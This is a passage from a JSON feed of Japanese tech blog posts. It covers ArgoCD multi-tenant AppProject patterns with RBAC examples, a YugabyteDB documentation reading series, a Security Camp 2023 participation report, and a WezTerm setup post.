(第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。なお、オススメするものを ★ としています。    テナント例(二重テナント)    オススメ  Namespace(第一テナント)    AppProject(第二テナント)  テナント例1      プロダクトの実行環境別      プロダクトの実行環境別          テナント例2      プロダクト別      プロダクトの実行環境別      ★    テナント例3      プロダクト別      プロダクトのサブチーム別      ★★    ▶ Namespaceの分割パターンについて\\"管理チーム別\\" (今回でいうプロダクト別) というNamespaceの分割パターンは、様々な著名な書籍やブログで紹介されています\uD83D\uDC40  https://www.amazon.co.jp/dp/1617293725Kubernetes best practices: Specifying Namespaces in YAML | Google Cloud Blogテナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。この場合に、プロダクトの実行環境別にNamespace (dev、tes) とAppProject (dev、tes) を用意します。オススメしなかった理由テナント例1には、以下のメリデメがあります。独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                                                                                                   デメリットの回避策                                                                                       拡張性                 -                                                                                                                                               ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりやすい。その時点で、AppProjectテナントの増やせなくなる。  ➡︎  例えばAWS EKSの場合、Node数を増やしたり、Nodeのスペックを上げる。ただ、お金がかかる\uD83D\uDE2D       安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                             ➡︎  -                                                                                                        保守性                 異なる実行環境に関するApplicationが共存しておらず、別のargocd-serverから操作することになるため、実行環境間の選択ミスが起こりにくい。            -                                                                                                                                             ➡︎  -                                                                                         テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトの実行環境別にAppProject (dev、tes) を用意します。オススメした理由テナント例2には、以下のメリデメがあります。独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                   -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                          異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。特にオススメした理由テナント例3には、以下のメリデメがあります。独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                       デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                                          -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可のサブチーム別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                                                 異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 06. どのような誤った操作を防いでくれるのかそろそろ解説を読むのがしんどい方がいるのではないでしょうか。『君がッ、泣くまで、解説をやめないッ！』AppProjectテナントとNamespacedスコープモードがマニフェストのデプロイをどのように制限するのかについて、例を挙げて解説します。ここでは、以下のAppProjectを作成したと仮定します。AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # appチーム  name: app  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"      # プロダクト用Clusterに関する認可を設定する      # Namespace (app) へのデプロイを許可する    - namespace: app      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comapiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # infraチーム  name: infra  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    # Namespace (infra) へのデプロイを許可する    - namespace: infra      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comマニフェストのデプロイ制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、マニフェストのデプロイを制限します。マニフェストをデプロイできる場合マニフェストを正しくデプロイする場合、AppProjectテナントはこれを制限しません。(1) argocd-serverは、argocd-cmd-params-cmからアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、argocd-serverは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) fooプロダクトのinfraチームが、argocd-serverを操作します。(3) argocd-serverは、argocd-rbac-cmからApplication操作に関する認可スコープを取得しますapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"(4) infraチームは、認可されたAppProjectに所属するApplicationを操作します。(5) infraチームは、Dev環境のfooプロダクト用ClusterのNamespace (infra) にマニフェストをデプロイできます。(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが無認可のNamespace (bar) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。namespace bar is not permitted in project \'infra-team\'無認可のNamespaceでApplicationを作れてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/test/e2e/app_management_ns_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが、無認可のAppProject (app) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。Application referencing project \'app\' which does not exist任意のAppProjectでApplicationを作成できてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のプロダクト用Cluster (bar-cluster) をデプロイ先として指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://bar-cluster.gr7.ap-northeast-1.eks.amazonaws.com infra} is not permitted in project \'infra-team\'任意のClusterをデプロイ先に指定できてしまうと、Applicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のNamespace (app) をデプロイ先に指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com app} is not permitted in project \'infra-team\'任意のNamespaceをデプロイ先に指定できてしまうと、そのApplicationから無認可のNamespaceにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub▶ AppProjectで設定できる認可の種類についてargocd-serverとapplication-controllerでデプロイできるKubernetesリソースの種類 (.spec.clusterResourceWhitelistキー、.spec.namespaceResourceWhitelistキーなど)repo-serverでポーリングできるリポジトリ (.spec.sourceReposキー)apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  clusterResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  namespaceResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  sourceRepos:    - \\"*\\"  ...\\"AppProjectテナントによるマニフェストのデプロイ丸ごとの制限\\" という観点でテーマが異なるため、本記事では言及しませんでした\uD83D\uDE47\uD83C\uDFFB‍  Projects - Argo CD - Declarative GitOps CD for KubernetesDeclarative Setup - Argo CD - Declarative GitOps CD for KubernetesカスタムリソースのReconciliation制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、ArgoCD系カスタムリソースに対するapplication-controllerのReconciliationを制限します。ArgoCD系カスタムリソースをReconciliationできる場合正しいNamespaceに対してReconciliationを実行する場合、AppProjectテナントはこれを制限しません。(1) application-controllerは、argocd-cmd-params-cmから自身がアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、application-controllerは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) application-controllerは、同じNamespaceに所属するArgoCD系カスタムリソースに対して、Reconciliationを実行します。(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合例えば、application-controllerがReconciliationの対象とするNamespaceを選ぼうとしているとします。すると、application-controllerは内部で検証メソッドを実行し、無認可のNamespace (bar) は選ばないようにします。argo-cd/controller/appcontroller_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub07. おわりにKubernetesのマルチテナントパターンとArgoCDでのパターン実践をもりもり布教しました。あらゆる面からマニフェストのデプロイを制限してくれる、AppProjectテナントの素晴らしさが伝わりましたでしょうか。KubernetesのマルチテナントパターンをArgoCDでどう実践するべきか、について困っている方の助けになれば幸いです\uD83D\uDC4D謝辞本記事のタイトルは、私が崇拝しているドメイン駆動設計の書籍 \\"実践ドメイン駆動設計\\" から拝借しました\uD83D\uDE4Fまた、ArgoCDでのパターン実践の収集にあたり、以下の方からの意見も参考にさせていただきました。@toversus26 さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook: Kubernetes Automation in Practice (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","isoDate":"2023-08-18T02:06:46.000Z","dateMiliSeconds":1692324406000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"YugabyteDBのドキュメントを全部読む Day5","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/5_core_functions_universe_creation","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-Master serviceを読みました。今回はArchitecture > Core functions > Universe creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Universe creationYugabyteDBのユニバース作成は複数のステップを含む。Start YB-MastersYBユニバース作成の最初のステップはレプリケーションファクターで指定された数だけYB-Masterを作成することである。作成されたYB-Masterはそれぞれを認識している。YB-Masterはユニバース内でユニークなID(UUID)をそれぞれに割り当て、それぞれを認識しあったあとにリーダーエレクションを実行する。このステップの終りにYB-Masterの中のひとつがリーダーとして確立される。Start YB-TServersノードの数だけYB-TServerを起動し、それぞれにマスターのアドレスを渡す。それぞれのYB-TServerはマスターにハートビートを送信し、正常に動作していることを確認する。ハートビートはYB-TServerが現在ホストしているタブレットとその負荷情報についても通信するが、この時点ではタブレットにデータは登録されていない。Examples4ノードからなるYBユニバースにテーブルを作成する場合について考える。テーブルのレプリケーションファクターは3とする。3つのマスターがcreateモードで起動される。これはマスターがすでに起動しているために発生するエラーを防ぐために明示的に実行される。リーダーエレクションを実行し、リーダーを選出する。YB-TServerが起動し、全てのYB-TServerがマスターにハートビートを送信する。","isoDate":"2023-08-16T13:49:19.000Z","dateMiliSeconds":1692193759000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"セキュリティ・キャンプ 2023 参加記","link":"https://moz-security.hatenablog.com/entry/2023/08/15/015853","contentSnippet":"8月7日から8月11日まで開催されたセキュリティ・キャンプの Bクラス（Webセキュリティ）に参加してきたので、やってきたことや感想について、体験記として書き残そうと思う。セキュリティ・キャンプについては、以下のホームページを参照してほしい。今年が20回目の開催で、4年ぶりに対面で行われた。www.ipa.go.jp応募課題まず、セキュリティ・キャンプに参加するには、応募課題を解かなければならない。これに関しては、また別のブログとして、私の答案については出そうと思うが、今までのプログラミング言語やコンテナ技術の利用経験を問われたり、Webにおける脆弱性の検証と調査、Webの標準や実装の調査を行なって、それをレポートとしてまとめ、提出した．応募課題は、下記のURLにある。セキュリティ・キャンプ全国大会2023 応募要項（エントリー） | デジタル人材の育成 | IPA 独立行政法人 情報処理推進機構共通講義共通講義では、行動経済学やXR、国際政治とセキュリティといったものやサイバー犯罪についての講義があった。これらについてはあまり書かないが、日頃勉強している技術的なもの以外の部分について学ぶことができるいい機会であり、新鮮であった。サイバーセキュリティという分野は、法律・犯罪と密接に関連してくるにも関わらず、グレー部分の範囲がとても広くて、どこまでが許されて、どこからがダメなのかという判断が難しい。そのため、ワークショップの形で弁護士や検事の方の考えを知ることができたのはよかった。講義の中でも仰っていたが、私はあくまで技術者であり、法律家ではない。だからこそ、”わかった気にならない”という点は気をつけようと思った。専門講義専門講義では、各クラスによって講義が変わってくる。Bクラスでは、Webセキュリティをテーマにして、講義が構成されている。基本的には４時間の講義で、どれも座学と演習が 1:1 くらいの割合になっており、手を動かしたり、ツールの動きを確認しながらだったため、概念だけでなく、実装も学べたし、何よりも楽しかった。講師の方が一般に公開している資料については一緒に貼っている。1日目B-1 Webプロダクトセキュリティへの誘い最初の講義は、初日の18:30~20:30に行われた。この講義では、プロデューサーがどのような意図を持って講義を構成したか、何を学んでほしいのかというところを整理した。このクラスでは、\\"将来と今の両方を考えて、意思決定ができるリーダーになること\\" を目標としており、その時点でいろいろ考えさせられた．私の感覚では、すごいセキュリティエンジニアというのは、技術のことをたくさん知っていることだったからである．でも、実際に社会に出ると、技術とは違ったベクトルの強さというものが必要だとわかった．これに関しては、 この時点でも納得はしていたが、B-5やB-7の講義を受けた後により強く実感した．技術的な強さだけであれば、5日間ひたすらWebアプリケーションの脆弱性を勉強して、探せばいいが、そのような構成にはなっていない．\\"How と Why を考えながら受講すること\\"というのは念を押されたが、これに関しては、非常に大切なことであり、日頃から意識する必要があると感じた。また、B-2からB-7の講義に関して、自分がどこまでわかっていて、どのようなことを学べそうか、何を習得することを目標にするかというのを考えて、グループワークでお互いに共有した．1つ例を挙げると、B-2の講義に関して、サイバーキルチェーンやActive Directoryはわかるが CI/CDパイプライン を狙った攻撃とはなんなのか、加えて攻撃者はどういう視点とか考えで攻撃を計画するのかというのはわからないから学びたいというのがあった．2日目B-2 開発のプロセスを攻撃者の視点で捉えるこの講義は、2日目の8:30~12:30に行われた．この講義では、なぜ攻撃をするのかというところから始まり、レッドチーム演習の効果やサイバーキルチェーンと攻撃フローについて座学で学んだ．また、仮想環境で攻撃演習を行うことで、実際に攻撃フローを見ることができた．演習で自分で攻撃してみることで、攻撃者の視点というものをより実感することができた．最終的には、防御側ができることを考えたが、攻撃者の視点を持つことで、より深く考えることができた．レッドチーム演習の情報はWebで調べてもあまり出てこないため、その界隈の第一人者の方から、生の声を聞けたのはよかったし、貴重な経験になった．最近、Hack The Boxに取り組めていなかったが，講義を受講して、モチベーションが上がり、また再開した．この講義では、CI/CD環境のセキュリティについても学んだ．オンプレミスからクラウドへと環境の変化はあるが、\\"攻撃方法は変わったとしても、攻撃の流れは変わらない\\"というのが大事な点であった．例えば、攻撃モデルの一つにサイバーキルチェーンがあるが、この考え方はオンプレでもクラウドでも関係なく、有効である．今までCI/CDを狙った攻撃というのは全く想像もつかなかったが Github Actions などの CI/CD Configuration から Credential が漏洩したり、3rd party tool を汚染することで莫大な被害につながるといった CI/CD Pipeline への攻撃もなんとなく理解できた．B-3 クラウドネイティブセキュリティの実践と戦略この講義は、2日目の13:30~17:30に行われた．この講義では、そもそもクラウドネイティブとはなんなのかの説明を受けたのちに、Kubernetesが提供する耐障害性の機能やマイクロサービスのセキュリティについて学んだ．k8sを実際に動かして、アプリケーションのスケーリングの様子などを確認しながら進めることができたのはとてもよかった．また、コンテナから権限掌握→AWSアカウントの侵害という演習を通して、クラウドネイティブ環境を構築・運用するにあたって、どのようなことに気をつけなければならないかといったことを学んだ．k8sのセキュリティモニタリングに関して、eBPFの紹介も少しあった．事前課題や講義を通して、最低限 k8s が動かせるようになったり、提供している一部の仕組みについてはわかったりしたが、まだまだ知らない機能はたくさんあるし、現在進行形で新たな技術が生まれている分野である．たしかにクラウドネイティブ環境の構築・運用は難しいのかもしれないが、技術の面白さというのはとても感じたし、もっともっと学んでいきたいと思った．3日目B-4 Webサービスにおける安全な認証とID連携の実装この講義は、2日目の14:00~18:00に行われた．この講義では、最初に認証・認可の技術であるFIDO, WebAuthn, Passkey, OAuth, OpenID Connect についての用語とそれぞれの用語の関係に関して説明を受けた．各用語は知っているが、説明できるほどの理解はできていなかったため、整理して学ぶことができ、理解できた．また、認証・認可はWebアプリにおいて最もクリティカルな箇所であり,セキュリティも十分に配慮しなければならない．CSRFの発生メカニズムを押さえ、どうすれば防ぐことができOpenID Connectではどのような処理フローになっているのかを学ぶことで、安全な認証・認可を実現する仕組みについて理解できた．その後、パスキーのハンズオンとOpen ID Connectのハンズオンを行なった．ハンズオンでは、プログラムの穴あき部分を埋めることで、ちゃんと機能が実装できているか確認しながらステップアップ形式で進めた．ID連携やパスキーの実装となると、難しいイメージだったが、すでにあるライブラリを使うことで、簡単に実装することができた．一度学んだとしても、使わなければ忘れてしまうため、Webアプリケーションを開発するときに、今回学んだ技術を組み込むことで、さらなる理解と自分で使える技術にしたいと思う．B-5 適応し続けるプロダクトセキュリティ speakerdeck.com\xa0この講義は，3日目の19:00~20:40に行われた．この講義では，組織やプロダクトの変化に対して，セキュリティをどう確保するのか考える技術者というよりは，CISOといったセキュリティにおいてリーダーシップを発揮し，変化に対応する組織を作るにはどうすればいいのかといったことを学んだ．プロデューサーの\\"将来と今の両方を考えて，意思決定ができるリーダーになること\\"という思いが最も顕著に出ている講義であった．昨今の世の中は，プロダクトも組織もどんどん変化する時代であり，その変化に応じて，セキュリティのあり方も変わってくる．セキュリティの難しさはどこか一つでも弱い部分があってはいけないというところである．サービスを提供する場合，何か一つ強みがあれば，それで大ヒットするかもしれないが，セキュリティは全てが一定水準にならなければならない．プロダクト運営に求められるセキュリティは幅広いが，バランスよく，少しずつ積み重ねていくことが大事だとわかった．個人的には，セキュリティ人材が置かれる現実と求められることというところが面白く，より優れたセキュリティ人材，セキュリティ分野でリーダーシップを発揮して組織を変えるには，人間としての成長が不可欠だとわかった．\\"深化と探索のバランスとそれらの継続\\" が重要になってくると学んだ．将来は，セキュリティ関連の仕事をしたいとは思っていたが，CISOのようなリーダーシップを発揮して組織を変えていくということは考えたことがなかった．セキュリティ人材として成長するために，人間的な成長が必要になるというのは面白かった．4日目B-6 ソースコード解析によるWebアプリケーションの脆弱性調査この講義は，4日目の8:30~12:30に行われた．この講義では，ソースコードから脆弱性を探す方法について学んだ．最初に，静的解析で見つけやすい脆弱性の説明を受け，演習として，まずは，脆弱性を手動で探した．CVEが3つ取り上げられており，それらの脆弱性をNVDやそこに載っているGithubのPatchのプログラムやPoCを見て，調査した．プログラムベースで実際にどのような入力値であれば，脆弱性が悪用できるのかを探すのがこの調査のゴールであった．しかし，複雑なWebアプリケーションになると，大量の関数呼び出しによって，コードを追うのが大変になる．そこで，脆弱性調査の自動化のためのツールとして，CodeQLの説明があり，その後の演習で実際に使って，調査を行った．CodeQLを使うことで，特定の関数呼び出しや変数宣言，構文パターンを抽出することができ，脆弱性となりうるコードが含まれていないか簡単に調査できることがわかった．プログラムを書くことはあっても，解析して脆弱性を探し出すといったことはやったことがなかったため，新たな知見が得られたのはよかったし，楽しかった．自分で書いたコードに対して，脆弱性を探し，修正するといったことやバグバウンティに取り組むといったことも今後していきたいと思った．B-7 Policy as Code 入門docs.google.comこの講義は，4日目の13:30~17:30に行われた．この講義では，ポリシーをコードとして書くことで，k8sの設定ファイルやクラウドサービスのリソース状態の監視結果に対して制約を満たすかどうかチェックすることができるといったことを学んだ．この講義に関しても，B-5と同じで，一見セキュリティと関係ないため，今まで勉強してきたことがなかったが，クラウドサービスのリソースにポリシーを定義して不要なポートが開いてないかやクレデンシャルが書き込まれていないかなどのチェックはセキュリティ向上のためにも有効である．一部の先進的な組織しかPolicy as Codeを実践できていないという部分で，まだまだ新しい技術ではあるが，この講義を通して，こういうものがあるということを知れたのはよかった．演習では，3以降のよりリアルなポリシーになった途端に難しく，書くのに苦戦した．いつ使うことになるかわからないが，このようなものがあるというのを覚えておいて，いざという時に使えるようにしたいと思う．講義全体を通してB-1からB-7まで非常に幅広い分野の講義があり，それに加え，どの講義も4時間で終わり切らない程濃密なものであったため，まだ整理ができていない部分も多々ある．本当に知識をひたすら叩き込まれた感じであるため，また時間を取って整理して，理解したいと思う．4日間講義があり，ホームルームの時には思考停止するほどの疲れがあったが，講義内容の濃さと演習の楽しさでものすごい充実感はあった．あと，講義のレベルも高く，わからない箇所があったりもしたが，講師の方やチューターの方に質問するとなんでも教えてくださったため，問題なく演習を進めたり，疑問点を残すことなく学ぶことができた．対面での開催について今年は，4年ぶりの現地開催ということだったが，本当に楽しかった．5日間だけで，たくさんの人に出会ったし，たくさん話した．基本的にクラスで講義を受けるため，クラスの人とはずっと一緒にいることになり，仲良くなるが，だからこそ，食事のときや名刺交換会というのは違うクラスの子とも知り合ういい機会だった．ジュニアで参加している中学生とかから同世代の受講生やチューター，実際に社会で活躍している講師の方たちまで異なる立場や年齢の人たちと話すことができたのはよかった．X（Twitter）の中でよく見るすごい人たちと面と向かって話したり，議論できたりするのは楽しかったし，とても刺激を受けた．授業はもちろん素晴らしいのだが，同世代で自分よりもすごい人たちと出会い，それによってモチベーションが爆増するというのが個人的にはセキュリティ・キャンプに参加する一番のよさだと思う．学内という狭い世界で自分はそれなりにできると思っていても，全国から人が集まってくるセキュリティ・キャンプでは上には上がたくさんいるというのをすごい体感したし，もっと頑張ろうと思った．参加した感想今年22歳になるため，今年が最後のチャンスだったが，本当に参加することができて良かった．キャンプ参加が決まった後も，講義に対してワクワクしながらも，一方で講義についていけるのか，私みたいな人が行って大丈夫なのか，他の人たちはやっぱりつよつよなのかという不安はあったが，そんな不安は初日で解消した．たしかに，みんなすごい人たちだったが，コミュニケーションを取る上では，ITに興味があるというその一点だけで仲良くなることができたし，講義でわからないことがあったとしても，他の受講生やチューター，講師の方に聞いたらちゃんと教えてくださった．セキュリティに興味があるのなら，少しでも早いうちから応募課題に挑戦するべきだと思うし，そこで得られるものはたくさんある．たとえ，課題で落ちてしまったとしても，課題を解くことに意味があり，それだけでも知らないことをたくさん学ぶことができる．セキュリティ・キャンプ 2023 に参加したからこそ，心の底から参加することを勧めたい．来年は，チューターかネクストキャンプ受講生としてまた戻って来たいと思う．まとめ・どの講義も濃密で、わからない部分もあったが、チューターや講師の方のサポートもあり、なんとかついていくことができた．・やっぱり対面での開催はいい．・全国のすごい人たちを間近に見ることができ、刺激がもらえる．・セキュリティに興味がある人はもちろん、ITに興味がある人全員にセキュリティ・キャンプを進めたい．","isoDate":"2023-08-14T16:58:53.000Z","dateMiliSeconds":1692032333000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"WezTerm で快適な WSL2 環境にする","link":"https://blog.1q77.com/2023/08/wezterm-on-windows/","contentSnippet":"家の自分用 Laptop はずっと Linux を使ってきましたが、数か月前に Inspiron 14 に買い替えたタイミングで Ubuntu 22.04 にしてからやっぱり不便だなあとも思っていました。(InputMethod の切り替えで直接入力とひらがなだけにしたいのに Hankaku ってのが外せないとか、電源管理回りとか、snap でインストールしたアプリは日本語入力できないとか)","isoDate":"2023-08-12T11:07:01.000Z","dateMiliSeconds":1691838421000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"YugabyteDBのドキュメントを全部読む Day4","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/4_key_concepts_yb_master_service","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-TServer serviceを読みました。今回はArchitecture > Key Concepts > YB-Master serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。YB-Master serviceYB-Masterサービスはテーブルやそのタブレットの場所、ユーザー・ロールの権限といったシステムのメタデータとレコードの管理を行っている。それに加えYB-Masterはロードバランシングやレプリケーションの開始といったバックグラウンドオペレーションの管理や、テーブルのCREATEやALTER、DROPといった様々な管理オペレーションの責任を持つ。YB-MasterはRaft Groupを組むことで高可用性を実現し、またテーブルに対するI/Oの単一障害点にならない。Functions of YB-MasterYB-Masterはシステムの重要な機能を複数持っている。Coordination of universe-wide administrative operationsCREATE TABLEやALTER TABLE、DROP TABLEといったユーザーからのリクエスト処理やバックアップの実行などUniverseをまたぐオペレーション実行の調整を担当している。YB-Masterではこれらのオペレーションがテーブルを保持するYB-TServerの状態に関わらず、全てのテーブルに伝搬されることを保証する。YugabyteDBは分散システムのため、Universeをまたぐ処理中にYB-TServerに障害が発生し一部のタブレットへの適用に失敗してもオペレーションの結果に問題が発生しないことが重要だからである。Storage of system metadataそれぞれのYB-Masterではネームスペースやテーブル、ロール、パーミッション、YB-TServerへ割り当てたテーブル情報を含むシステムメタデータを保存している。これらのシステムレコードはYB-Masterを対象にRaftグループを組みレプリケーションすることで冗長性を実現している。またシステムレコードはYB-Masterが管理するDocDBに保存される。Authoritative source of tablet assignments to YB-TServersYB-Masterは全てのテーブルとそれらをホストするYB-TServerの情報を保存している。一般のクライアントではそれらの情報はクライアントからクエリレイヤなどを通して取得された上で、クライアントにメタデータを返しデータアクセスが行なわれる。一方でスマートクライアントではYB-Masterに保存されたメタデータを利用して特定のYB-TServerが保持するタブレットやキャッシュを利用することが出来るため、データアクセス時のネットワークをまたぐ通信を減らすことができパフォーマンスを高めることができる。Background operationsいくつかのオペレーションはUniverseのライフタイムを通してバックグラウンドで行なうことで、フォアグラウンドのRead/Writeに影響を与えずに実行することが出来る。Data placement and load balancingYB-MasterのリーダーはCREATE TABLE時にタブレットの初期配置をYB-TServerをまたいで行なう。そのときにユーザー定義のデータ配置制約を強制し均一な読み込みを保証する。Universeのライフタイム中のノード追加や障害が発生しても、負荷分散を継続しデータ配置の制約を自動的に適用する。Leader balancing複数のYB-TServerに配置されたタブレットへのアクセスがUniverseをまたいで分散されることを保証している一方で、YB-Masterは対象となるノード1間でそれぞれのノードが同じ数のtablet-peer leader2をもつことを保証する。Rereplication of data on extended YB-TServer failureYB-Masterは全てのYB-TServerからハードビートシグナルを受け取ることでYB-TServerの死活監視を行なっている。そしてYB-MasterはYB-TServerの異常を検知したときに、どれぐらいのあいだYB-TServerが異常であったかを追跡する。閾値を超えると、YB-Masterは障害中のYB-TServerに配置されていたタブレットを再配置するYB-TServerを探し、レプリケーションを実行する。レプリケーションはYB-Masterリーダーに抑制された状態で実行されるため、Universeのフォアグラウンドオペレーションには影響をおよぼさない。Raft Groupのリーダーになれるノード↩↩","isoDate":"2023-08-03T14:48:34.000Z","dateMiliSeconds":1691074114000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day3","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/3_key_concepts_yb_tserver_service","contentSnippet":"YugabyteDBのドキュメントを全部読む Day3前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > Universeを読みました。今回はArchitecture > Key Concepts > YB-TServer serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。それはそれとして技術系の単語をカタカナ表記で誤魔化していて、体系的に学んでいないことがバレてしまう。特にストレージまわりが分からない……YB-TServer serviceYB-TServer(YugabyteDB Tablet Servcer)はユーザからの受けつけたYugabyteDBクラスタへのリクエストのI/Oの処理をする。テーブルのデータは一つ以上のTablet peerに分割(シャーディング)される。peerの数はレプリケーションファクターによって決定される。YB-TServerは一つ以上のTablet peerをホストする。Tablet peerはRaftグループを形成してグループ間でデータの複製を行ない、タブレットはYB-TServer上で最大の効率になるように管理される。Server-global block cacheブロックキャッシュは一つTB-TServer上の異なるタブレット間で共有される。YB-TServerのメモリ効率は一つのテーブルからの読み込みが多いほど最適化される。Space AmplificationYugabyteDBではSize-tired Compactionというライトアンプリフィケーション1が小さい圧縮方式を利用している。Size-tired 